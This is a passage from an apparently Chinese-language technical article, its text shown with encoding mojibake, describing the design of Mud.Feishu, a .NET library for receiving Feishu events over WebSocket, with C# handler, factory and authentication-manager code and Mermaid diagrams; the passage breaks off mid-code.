<p><strong>æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>å¼€å‘ä¾¿æ·</strong>ï¼šæ— éœ€å…¬ç½‘IPæˆ–åŸŸåï¼Œæœ¬åœ°ç¯å¢ƒå³å¯æ¥æ”¶å›è°ƒ</li>
<li><strong>å®‰å…¨ä¼ è¾“</strong>ï¼šå†…ç½®åŠ å¯†å’Œé‰´æƒï¼Œæ— éœ€é¢å¤–å®‰å…¨å¤„ç†</li>
<li><strong>å®æ—¶æ€§å¼º</strong>ï¼šæ¶ˆæ¯å»¶è¿Ÿä»åˆ†é’Ÿçº§é™è‡³æ¯«ç§’çº§</li>
<li><strong>èµ„æºé«˜æ•ˆ</strong>ï¼šé¿å…é¢‘ç¹HTTPè¯·æ±‚ï¼Œè¿æ¥å¤ç”¨å¤šç§äº‹ä»¶ç±»å‹</li>
</ul>
<p><strong>ä¼ä¸šçº§åº”ç”¨åœºæ™¯</strong></p>
<p>é£ä¹¦å¹³å°æä¾›ä¸°å¯Œçš„äº‹ä»¶ç±»å‹ï¼Œæ”¯æŒï¼š</p>
<ul>
<li><strong>ç”¨æˆ·äº‹ä»¶</strong>ï¼šå‘˜å·¥å…¥èŒ/ç¦»èŒè‡ªåŠ¨åŒ–å¤„ç†</li>
<li><strong>æ¶ˆæ¯äº‹ä»¶</strong>ï¼šæ™ºèƒ½å®¢æœã€æ¶ˆæ¯æœºå™¨äºº</li>
<li><strong>å®¡æ‰¹äº‹ä»¶</strong>ï¼šOAç³»ç»Ÿé›†æˆã€è‡ªåŠ¨å®¡æ‰¹</li>
<li><strong>éƒ¨é—¨äº‹ä»¶</strong>ï¼šç»„ç»‡æ¶æ„åŒæ­¥ç®¡ç†</li>
<li><strong>å…¶å®ƒäº‹ä»¶</strong>ï¼š.....</li>
</ul>
<p><strong>Mud.Feishuæ¶æ„è®¾è®¡</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant FS as é£ä¹¦å¹³å°
    participant WS as Mud.Feishu.WebSocketè¿æ¥
    participant MF as Mud.Feishu.Abstractionsæ¡†æ¶
    participant APP as ä¸šåŠ¡åº”ç”¨
    
    FS-&gt;&gt;WS: äº‹ä»¶æ¨é€
    WS-&gt;&gt;MF: æ¶ˆæ¯è·¯ç”±
    MF-&gt;&gt;MF: äº‹ä»¶è¯†åˆ«
    MF-&gt;&gt;APP: ä¸šåŠ¡å¤„ç†
    APP-&gt;&gt;MF: å¤„ç†ç»“æœ
    MF-&gt;&gt;WS: ACKç¡®è®¤
    WS-&gt;&gt;FS: çŠ¶æ€åé¦ˆ
</code></pre>
<h2 data-id="heading-2">äºŒã€æŠ½è±¡å±‚è®¾è®¡ï¼ˆMud.Feishu.Abstractionsï¼‰</h2>
<h3 data-id="heading-3">äº‹ä»¶å¤„ç†ç­–ç•¥æ¨¡å¼</h3>
<p>Mud.Feishué‡‡ç”¨ç­–ç•¥æ¨¡å¼å®ç°çµæ´»çš„äº‹ä»¶å¤„ç†æœºåˆ¶ï¼Œæ ¸å¿ƒæ¥å£è®¾è®¡ç®€æ´è€Œå¼ºå¤§ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é£ä¹¦äº‹ä»¶å¤„ç†å™¨æ¥å£</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IFeishuEventHandler</span>
{
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ”¯æŒçš„äº‹ä»¶ç±»å‹</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-built_in">string</span> SupportedEventType { <span class="hljs-keyword">get</span>; }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¤„ç†äº‹ä»¶</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function">Task <span class="hljs-title">HandleAsync</span>(<span class="hljs-params">EventData eventData, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>;
}
</code></pre>
<p><strong>ç­–ç•¥æ¨¡å¼æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>ğŸ¯ <strong>å•ä¸€èŒè´£</strong>ï¼šæ¯ä¸ªå¤„ç†å™¨ä¸“æ³¨ç‰¹å®šäº‹ä»¶ç±»å‹</li>
<li>ğŸ”§ <strong>å¼€é—­åŸåˆ™</strong>ï¼šå¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å°é—­</li>
<li>ğŸ§ª <strong>å¯æµ‹è¯•æ€§</strong>ï¼šç‹¬ç«‹æµ‹è¯•ï¼Œä¾èµ–æ¸…æ™°</li>
<li>âš¡ <strong>è¿è¡Œæ—¶å¤šæ€</strong>ï¼šåŠ¨æ€é€‰æ‹©å¤„ç†ç­–ç•¥</li>
</ul>
<p><strong>å®é™…åº”ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ç”¨æˆ·åˆ›å»ºäº‹ä»¶å¤„ç†å™¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">UserCreatedEventHandler</span> : <span class="hljs-title">IFeishuEventHandler</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> SupportedEventType =&gt; <span class="hljs-string">"contact.user.created_v3"</span>;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">HandleAsync</span>(<span class="hljs-params">EventData eventData, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">var</span> user = JsonSerializer.Deserialize&lt;UserData&gt;(eventData.EventJson);
        <span class="hljs-keyword">await</span> _userService.CreateUserAsync(user, cancellationToken);
        _logger.LogInformation(<span class="hljs-string">"ç”¨æˆ·åˆ›å»ºäº‹ä»¶å¤„ç†å®Œæˆ: {UserId}"</span>, user.UserId);
    }
}

<span class="hljs-comment">// æ¶ˆæ¯æ¥æ”¶äº‹ä»¶å¤„ç†å™¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MessageReceiveEventHandler</span> : <span class="hljs-title">IFeishuEventHandler</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> SupportedEventType =&gt; <span class="hljs-string">"im.message.receive_v1"</span>;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">HandleAsync</span>(<span class="hljs-params">EventData eventData, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">var</span> message = JsonSerializer.Deserialize&lt;MessageData&gt;(eventData.EventJson);
        <span class="hljs-keyword">await</span> _messageService.ProcessMessageAsync(message, cancellationToken);
    }
}
</code></pre>
<h3 data-id="heading-4">äº‹ä»¶ç±»å‹ä¸æ•°æ®æ¨¡å‹</h3>
<p><strong>EventDataç»Ÿä¸€äº‹ä»¶æ¨¡å‹</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é£ä¹¦äº‹ä»¶æ•°æ®æ¨¡å‹ - ç»Ÿä¸€çš„äº‹ä»¶è½½ä½“</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">EventData</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> EventId { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-built_in">string</span>.Empty;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> EventType { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-built_in">string</span>.Empty;
    <span class="hljs-keyword">public</span> DateTime EventTime { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = DateTime.UtcNow;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">object</span>? Event { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> EventJson { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-built_in">string</span>.Empty;
}
</code></pre>
<p><strong>ä¸»è¦äº‹ä»¶ç±»å‹</strong></p>




























































<table><thead><tr><th>ç±»åˆ«</th><th>äº‹ä»¶ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>ç”¨æˆ·ç®¡ç†</strong></td><td><code>contact.user.created_v3</code></td><td>ç”¨æˆ·åˆ›å»º</td></tr><tr><td/><td><code>contact.user.updated_v3</code></td><td>ç”¨æˆ·æ›´æ–°</td></tr><tr><td/><td><code>contact.user.deleted_v3</code></td><td>ç”¨æˆ·åˆ é™¤</td></tr><tr><td><strong>æ¶ˆæ¯äº‹ä»¶</strong></td><td><code>im.message.receive_v1</code></td><td>æ¥æ”¶æ¶ˆæ¯</td></tr><tr><td/><td><code>im.message.message_read_v1</code></td><td>æ¶ˆæ¯å·²è¯»</td></tr><tr><td><strong>éƒ¨é—¨ç®¡ç†</strong></td><td><code>contact.department.created_v3</code></td><td>éƒ¨é—¨åˆ›å»º</td></tr><tr><td/><td><code>contact.department.updated_v3</code></td><td>éƒ¨é—¨æ›´æ–°</td></tr><tr><td><strong>å®¡æ‰¹æµç¨‹</strong></td><td><code>approval.approval.approved_v1</code></td><td>å®¡æ‰¹é€šè¿‡</td></tr><tr><td/><td><code>approval.approval.rejected_v1</code></td><td>å®¡æ‰¹æ‹’ç»</td></tr><tr><td>...</td><td><code>...</code></td><td>...</td></tr></tbody></table>
<p><strong>å¼ºç±»å‹æ•°æ®æ¨¡å‹ç¤ºä¾‹</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ç”¨æˆ·åˆ›å»ºäº‹ä»¶æ•°æ®</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">UserCreatedEvent</span>
{
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"user_id"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> UserId { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"name"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"email"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Email { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
}

<span class="hljs-comment">// æ¶ˆæ¯æ¥æ”¶äº‹ä»¶æ•°æ®</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MessageReceiveEvent</span>
{
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"message_id"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> MessageId { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"chat_id"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> ChatId { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    
    [<span class="hljs-meta">JsonPropertyName(<span class="hljs-string">"content"</span>)</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Content { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
}
</code></pre>
<h3 data-id="heading-5">å·¥å‚æ¨¡å¼åº”ç”¨</h3>
<p><strong>äº‹ä»¶å¤„ç†å™¨å·¥å‚</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> äº‹ä»¶å¤„ç†å™¨å·¥å‚æ¥å£</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IFeishuEventHandlerFactory</span>
{
    IFeishuEventHandler? GetHandler(<span class="hljs-built_in">string</span> eventType);
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RegisterHandler</span>(<span class="hljs-params">IFeishuEventHandler handler</span>)</span>;
    <span class="hljs-function">IReadOnlyList&lt;<span class="hljs-built_in">string</span>&gt; <span class="hljs-title">GetRegisteredEventTypes</span>()</span>;
}
</code></pre>
<p><strong>æ ¸å¿ƒå®ç°ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ğŸ­ <strong>åŠ¨æ€ç®¡ç†</strong>ï¼šæ”¯æŒè¿è¡Œæ—¶æ³¨å†Œ/æ³¨é”€äº‹ä»¶å¤„ç†å™¨</li>
<li>ğŸ”’ <strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šä½¿ç”¨ConcurrentDictionaryç¡®ä¿å¹¶å‘å®‰å…¨</li>
<li>ğŸ¯ <strong>ç²¾ç¡®åŒ¹é…</strong>ï¼šæ ¹æ®äº‹ä»¶ç±»å‹å¿«é€Ÿå®šä½å¯¹åº”å¤„ç†å™¨</li>
<li>ğŸ“Š <strong>çŠ¶æ€ç›‘æ§</strong>ï¼šæä¾›å·²æ³¨å†Œå¤„ç†å™¨çš„æŸ¥è¯¢èƒ½åŠ›</li>
</ul>
<p><strong>ä½¿ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// æ³¨å†Œäº‹ä»¶å¤„ç†å™¨</span>
<span class="hljs-keyword">var</span> factory = serviceProvider.GetService&lt;IFeishuEventHandlerFactory&gt;();
factory.RegisterHandler(<span class="hljs-keyword">new</span> UserCreatedEventHandler());
factory.RegisterHandler(<span class="hljs-keyword">new</span> MessageReceiveEventHandler());

<span class="hljs-comment">// è·å–å¤„ç†å™¨å¤„ç†äº‹ä»¶</span>
<span class="hljs-keyword">var</span> handler = factory.GetHandler(<span class="hljs-string">"contact.user.created_v3"</span>);
<span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>)
{
    <span class="hljs-keyword">await</span> handler.HandleAsync(eventData);
}
</code></pre>
<h2 data-id="heading-6">ä¸‰ã€æ ¸å¿ƒå®ç°å±‚ï¼ˆMud.Feishu.WebSocketï¼‰</h2>
<h3 data-id="heading-7">ç»„ä»¶åŒ–æ¶æ„è®¾è®¡</h3>
<p>Mud.Feishu.WebSocketé‡‡ç”¨ä¸¥æ ¼çš„ç»„ä»¶åŒ–è®¾è®¡ï¼ŒåŒ…å«å››ä¸ªæ ¸å¿ƒç»„ä»¶ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[FeishuWebSocketClient] --&gt; B[WebSocketConnectionManager]
    A --&gt; C[AuthenticationManager]
    A --&gt; D[MessageRouter]
    A --&gt; E[BinaryMessageProcessor]
    
    B --&gt; F[è¿æ¥å»ºç«‹ä¸ç»´æŠ¤]
    B --&gt; G[è‡ªåŠ¨é‡è¿æœºåˆ¶]
    C --&gt; H[èº«ä»½è®¤è¯]
    C --&gt; I[ä»¤ç‰Œç®¡ç†]
    D --&gt; J[æ¶ˆæ¯è·¯ç”±åˆ†å‘]
    E --&gt; K[äºŒè¿›åˆ¶æ•°æ®å¤„ç†]
</code></pre>
<h3 data-id="heading-8">3.1 è¿æ¥ç®¡ç†å™¨</h3>
<p><strong>æ ¸å¿ƒèŒè´£</strong></p>
<ul>
<li>ğŸ”— <strong>è¿æ¥ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ï¼šå»ºç«‹ã€ç»´æŠ¤ã€æ¢å¤WebSocketè¿æ¥</li>
<li>ğŸ”’ <strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šä½¿ç”¨SemaphoreSlimç¡®ä¿å¹¶å‘å®‰å…¨</li>
<li>â° <strong>è¶…æ—¶æ§åˆ¶</strong>ï¼šå¤šçº§å–æ¶ˆä»¤ç‰Œæ”¯æŒç²¾ç¡®è¶…æ—¶æ§åˆ¶</li>
<li>ğŸ”„ <strong>è‡ªåŠ¨é‡è¿</strong>ï¼šæ™ºèƒ½é‡è¿ç­–ç•¥ï¼Œæ”¯æŒæŒ‡æ•°é€€é¿ç®—æ³•</li>
</ul>
<p><strong>è¿æ¥çŠ¶æ€ç®¡ç†</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">stateDiagram-v2
    [*] --&gt; None
    None --&gt; Connecting
    Connecting --&gt; Connected
    Connecting --&gt; Failed
    Connected --&gt; Disconnecting
    Connected --&gt; Failed
    Failed --&gt; Connecting
    Disconnecting --&gt; None
</code></pre>
<p><strong>å…³é”®å®ç°ç‰¹ç‚¹</strong></p>
<ul>
<li>äº‹ä»¶é©±åŠ¨é€šçŸ¥æœºåˆ¶ï¼ˆConnected/Disconnected/Erroräº‹ä»¶ï¼‰</li>
<li>çº¿ç¨‹å®‰å…¨çš„è¿æ¥æ“ä½œ</li>
<li>çµæ´»çš„é‡è¿ç­–ç•¥é…ç½®</li>
</ul>
<p><strong>é‡è¿æœºåˆ¶</strong></p>
<ul>
<li>ğŸ” <strong>æŒ‡æ•°é€€é¿</strong>ï¼šé¿å…é‡è¿é£æš´</li>
<li>ğŸ² <strong>éšæœºæŠ–åŠ¨</strong>ï¼šé˜²æ­¢é›·ç¾¤æ•ˆåº”</li>
<li>ğŸ“Š <strong>çŠ¶æ€æ£€æµ‹</strong>ï¼šæ™ºèƒ½åˆ¤æ–­é‡è¿å¿…è¦æ€§</li>
<li>ğŸš« <strong>é™åˆ¶ä¿æŠ¤</strong>ï¼šæœ€å¤§é‡è¿æ¬¡æ•°ä¿æŠ¤</li>
</ul>
<p><strong>å¿ƒè·³ç›‘æ§</strong></p>
<ul>
<li>ğŸ’“ <strong>å®šæœŸæ£€æµ‹</strong>ï¼š30ç§’é—´éš”ç›‘æ§è¿æ¥å¥åº·</li>
<li>ğŸ“ˆ <strong>è´¨é‡åˆ†æ</strong>ï¼šå¿ƒè·³é—´éš”ç¨³å®šæ€§åˆ†æ</li>
<li>âš ï¸ <strong>å¼‚å¸¸é¢„è­¦</strong>ï¼šè¶…æ—¶è‡ªåŠ¨è§¦å‘é‡è¿</li>
</ul>
<h4 data-id="heading-9">3.2 è®¤è¯ç®¡ç†å™¨</h4>
<p><strong>è®¤è¯æµç¨‹è®¾è®¡</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">stateDiagram-v2
    [*] --&gt; Unauthenticated
    Unauthenticated --&gt; Authenticating: è°ƒç”¨AuthenticateAsync
    Authenticating --&gt; WaitingResponse: å‘é€è®¤è¯æ¶ˆæ¯
    WaitingResponse --&gt; Authenticated: è®¤è¯æˆåŠŸ
    WaitingResponse --&gt; AuthenticationFailed: è®¤è¯å¤±è´¥
    AuthenticationFailed --&gt; Authenticating: é‡è¯•è®¤è¯
    Authenticated --&gt; Unauthenticated: è¿æ¥æ–­å¼€
</code></pre>
<p><strong>æ ¸å¿ƒåŠŸèƒ½</strong></p>
<ul>
<li>ğŸ” <strong>ä»¤ç‰ŒéªŒè¯</strong>ï¼šåº”ç”¨è®¿é—®ä»¤ç‰Œæœ‰æ•ˆæ€§æ£€æŸ¥</li>
<li>ğŸ“¨ <strong>æ¶ˆæ¯æ„å»º</strong>ï¼šæ ‡å‡†åŒ–è®¤è¯æ¶ˆæ¯æ ¼å¼</li>
<li>ğŸ¯ <strong>çŠ¶æ€ç®¡ç†</strong>ï¼šè®¤è¯çŠ¶æ€å®æ—¶è·Ÿè¸ª</li>
<li>ğŸ”„ <strong>è‡ªåŠ¨é‡è¯•</strong>ï¼šè®¤è¯å¤±è´¥æ™ºèƒ½é‡è¯•æœºåˆ¶</li>
</ul>
<p><strong>è®¤è¯æ¶ˆæ¯æ ¼å¼</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"timestamp"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1703920800</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"app_access_token"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"your_app_access_token_here"</span>
    <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>è®¤è¯æœºåˆ¶æ¶æ„è®¾è®¡</strong></p>
<p>è®¤è¯ç®¡ç†å™¨é‡‡ç”¨å‘½ä»¤æ¨¡å¼å’Œå›è°ƒæœºåˆ¶ï¼Œå°†è®¤è¯é€»è¾‘ä¸ç½‘ç»œé€šä¿¡è§£è€¦ï¼Œç¡®ä¿è®¤è¯è¿‡ç¨‹çš„å¯æµ‹è¯•æ€§å’Œå¯æ‰©å±•æ€§ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> è®¤è¯ç®¡ç†å™¨ - å¤„ç†WebSocketè®¤è¯ç›¸å…³é€»è¾‘</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AuthenticationManager</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;AuthenticationManager&gt; _logger;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> Func&lt;<span class="hljs-built_in">string</span>, Task&gt; _sendMessageCallback;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> _isAuthenticated = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> FeishuWebSocketOptions _options;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;EventArgs&gt;? Authenticated;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;WebSocketErrorEventArgs&gt;? AuthenticationFailed;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> IsAuthenticated =&gt; _isAuthenticated;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">AuthenticationManager</span>(<span class="hljs-params">
        ILogger&lt;AuthenticationManager&gt; logger,
        FeishuWebSocketOptions options,
        Func&lt;<span class="hljs-built_in">string</span>, Task&gt; sendMessageCallback</span>)</span>
    {
        _logger = logger ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(logger));
        _sendMessageCallback = sendMessageCallback ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(sendMessageCallback));
        _options = options;
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å‘é€è®¤è¯æ¶ˆæ¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">AuthenticateAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> appAccessToken, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(appAccessToken))
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"åº”ç”¨è®¿é—®ä»¤ç‰Œä¸èƒ½ä¸ºç©º"</span>, <span class="hljs-keyword">nameof</span>(appAccessToken));
        
        <span class="hljs-keyword">try</span>
        {
            _logger.LogInformation(<span class="hljs-string">"æ­£åœ¨è¿›è¡ŒWebSocketè®¤è¯..."</span>);
            _isAuthenticated = <span class="hljs-literal">false</span>; <span class="hljs-comment">// é‡ç½®è®¤è¯çŠ¶æ€</span>
            
            <span class="hljs-comment">// åˆ›å»ºè®¤è¯æ¶ˆæ¯</span>
            <span class="hljs-keyword">var</span> authMessage = <span class="hljs-keyword">new</span> AuthMessage
            {
                Timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
                Data = <span class="hljs-keyword">new</span> AuthData
                {
                    AppAccessToken = appAccessToken
                }
            };
            
            <span class="hljs-keyword">var</span> jsonOptions = <span class="hljs-keyword">new</span> JsonSerializerOptions
            {
                DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
                WriteIndented = <span class="hljs-literal">false</span>
            };
            
            <span class="hljs-keyword">var</span> authJson = JsonSerializer.Serialize(authMessage, jsonOptions);
            <span class="hljs-keyword">await</span> _sendMessageCallback(authJson);
            
            _logger.LogInformation(<span class="hljs-string">"å·²å‘é€è®¤è¯æ¶ˆæ¯ï¼Œç­‰å¾…å“åº”..."</span>);
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _isAuthenticated = <span class="hljs-literal">false</span>;
            _logger.LogError(ex, <span class="hljs-string">"WebSocketè®¤è¯å¤±è´¥"</span>);
            
            <span class="hljs-keyword">var</span> errorArgs = <span class="hljs-keyword">new</span> WebSocketErrorEventArgs
            {
                Exception = ex,
                ErrorMessage = <span class="hljs-string">$"WebSocketè®¤è¯å¤±è´¥: <span class="hljs-subst">{ex.Message}</span>"</span>,
                ErrorType = ex.GetType().Name,
                IsAuthError = <span class="hljs-literal">true</span>
            };
            
            AuthenticationFailed?.Invoke(<span class="hljs-keyword">this</span>, errorArgs);
            <span class="hljs-keyword">throw</span>;
        }
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¤„ç†è®¤è¯å“åº”</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">HandleAuthResponse</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> responseMessage</span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">var</span> authResponse = JsonSerializer.Deserialize&lt;AuthResponseMessage&gt;(responseMessage);
            
            <span class="hljs-keyword">if</span> (authResponse?.Code == <span class="hljs-number">0</span>)
            {
                _isAuthenticated = <span class="hljs-literal">true</span>;
                _logger.LogInformation(<span class="hljs-string">"WebSocketè®¤è¯æˆåŠŸ: {Message}"</span>, authResponse.Message);
                Authenticated?.Invoke(<span class="hljs-keyword">this</span>, EventArgs.Empty);
            }
            <span class="hljs-keyword">else</span>
            {
                _isAuthenticated = <span class="hljs-literal">false</span>;
                _logger.LogError(<span class="hljs-string">"WebSocketè®¤è¯å¤±è´¥: {Code} - {Message}"</span>, 
                    authResponse?.Code, authResponse?.Message);
                
                <span class="hljs-keyword">var</span> errorArgs = <span class="hljs-keyword">new</span> WebSocketErrorEventArgs
                {
                    ErrorMessage = <span class="hljs-string">$"WebSocketè®¤è¯å¤±è´¥: <span class="hljs-subst">{authResponse?.Code}</span> - <span class="hljs-subst">{authResponse?.Message}</span>"</span>,
                    IsAuthError = <span class="hljs-literal">true</span>
                };
                
                AuthenticationFailed?.Invoke(<span class="hljs-keyword">this</span>, errorArgs);
            }
        }
        <span class="hljs-keyword">catch</span> (JsonException ex)
        {
            _isAuthenticated = <span class="hljs-literal">false</span>;
            _logger.LogError(ex, <span class="hljs-string">"è§£æè®¤è¯å“åº”å¤±è´¥: {Message}"</span>, responseMessage);
            
            <span class="hljs-keyword">var</span> errorArgs = <span class="hljs-keyword">new</span> WebSocketErrorEventArgs
            {
                Exception = ex,
                ErrorMessage = <span class="hljs-string">$"è§£æè®¤è¯å“åº”å¤±è´¥: <span class="hljs-subst">{ex.Message}</span>"</span>,
                ErrorType = ex.GetType().Name,
                IsAuthError = <span class="hljs-literal">true</span>
            };
            
            AuthenticationFailed?.Invoke(<span class="hljs-keyword">this</span>, errorArgs);
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _isAuthenticated = <span class="hljs-literal">false</span>;
            _logger.LogError(ex, <span class="hljs-string">"å¤„ç†è®¤è¯å“åº”æ—¶å‘ç”Ÿé”™è¯¯"</span>);
            
